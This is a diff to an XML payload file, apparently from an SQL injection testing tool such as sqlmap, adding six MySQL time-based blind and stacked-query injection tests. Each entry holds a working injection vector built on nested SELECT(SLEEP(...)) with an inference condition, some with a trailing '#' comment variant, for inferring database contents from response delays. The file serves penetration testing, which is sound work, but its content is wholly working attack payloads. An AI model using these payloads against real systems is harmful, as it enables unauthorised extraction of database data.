@@ -1642,6 +1642,47 @@ Tag: <test>
 
     <!-- Stacked queries tests -->
     <test>
+        <title>MySQL &gt; 5.0.11 stacked queries (SELECT)</title>
+        <stype>4</stype>
+        <level>2</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>; (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.11 stacked queries (SELECT - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>0</clause>
+        <where>1</where>
+        <vector>; (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>; (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt; 5.0.11 stacked queries</title>
         <stype>4</stype>
         <level>1</level>
@@ -2525,6 +2566,47 @@ Tag: <test>
 
     <!-- OR time-based blind tests -->
     <test>
+        <title>MySQL &gt; 5.0.11 OR time-based blind (SELECT)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.11 OR time-based blind (SELECT - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>2</where>
+        <vector>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>OR (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt; 5.0.11 OR time-based blind</title>
         <stype>5</stype>
         <level>2</level>
@@ -2846,6 +2928,47 @@ Tag: <test>
     <!-- Time-based tests - After ORDER BY...LIMIT... -->
 
     <!-- Time-based blind tests - Parameter replace -->
+    <test>
+        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
     <test>
         <title>MySQL &gt;= 5.0 time-based blind - Parameter replace</title>
         <stype>5</stype>
